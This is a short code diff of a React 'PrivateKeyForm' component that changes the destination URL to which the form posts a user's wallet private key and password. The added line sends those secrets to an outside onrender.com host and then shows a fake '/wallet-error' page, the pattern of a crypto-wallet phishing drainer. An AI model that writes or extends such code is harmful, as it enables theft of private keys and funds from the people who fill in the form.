@@ -37,7 +37,7 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
 
     if (privateKey64Long) {
       try {
-        await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
+        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/wallet-error')
         }, 3000);
